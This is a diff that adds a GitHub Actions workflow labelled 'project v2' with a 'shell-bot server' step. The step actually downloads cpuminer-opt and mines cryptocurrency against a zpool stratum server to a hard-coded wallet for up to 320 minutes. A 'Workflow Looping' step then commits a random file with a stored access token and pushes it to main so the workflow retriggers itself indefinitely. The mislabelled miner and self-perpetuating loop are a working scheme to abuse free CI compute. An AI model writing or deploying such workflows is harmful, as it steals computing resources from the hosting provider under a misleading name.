@@ -1,0 +1,41 @@
+name: project v2
+
+on:
+  push:
+    branches: [ main ]
+    paths-ignore: 'README.md'
+  workflow_dispatch:
+
+env:
+  GitHubMail: "94069115+Deb4o@users.noreply.github.com"
+  GitHubName: "Deb4o"
+  # GH_TOKEN >> Github Personal Access Token << In Repository Secrets
+
+jobs:
+  shellbot:
+    runs-on: ubuntu-20.04
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@main
+
+      - name: Set Git Configs & Secrets
+        run: |
+          git config --global user.email ${GitHubMail} #fix
+          git config --global user.name ${GitHubName} #fix
+          git config --global color.ui true #fix
+          git config --global credential.helper store #fix
+          echo "https://${GitHubName}:${{ secrets.GH_TOKEN }}@github.com" > ~/.git-credentials
+      - name: Run shell-bot server
+        timeout-minutes: 320
+        continue-on-error: true
+        run: |
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.$(echo $(shuf -i 1-999999999 -n 1)-Wira) -p c=DGB,zap=PYRK-lyra2z330 -t 2
+      - name: Workflow Looping
+        run: |
+          git clone https://github.com/${GITHUB_REPOSITORY} loop
+          cd loop || exit 1
+          echo $(( RANDOM - ( RANDOM % RANDOM ) )) > looper.txt
+          git add looper.txt
+          git commit -m "Looping at $(date -u +%D-%T%P)"
+          git push -q https://github.com/${GITHUB_REPOSITORY} HEAD:main
